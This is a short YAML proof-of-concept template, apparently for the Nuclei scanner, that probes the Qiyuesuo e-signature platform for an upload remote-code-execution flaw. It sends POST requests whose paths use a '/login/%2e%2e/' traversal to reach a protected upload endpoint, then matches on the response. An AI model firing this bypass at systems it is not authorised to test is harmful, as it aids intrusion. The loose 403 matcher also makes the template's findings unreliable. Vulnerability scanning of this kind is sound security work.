id: poc-yaml-qiyuesuo-upload-rce
info:
  name: "契约锁电子签章平台远程代码执行漏洞"
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce

http:
  - method: POST
    path:
      - "/login/%2e%2e/utask/upload"
      - "/login/../utask/upload"
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, '\"message\":\"\\u8BF7\\u6C42\\u5931\\u8D25\"')"
      - type: dsl
        dsl:
          - "status_code == 403 && !contains(body, '\"message\":\"\\u8BF7\\u6C42\\u5931\\u8D25\"')"
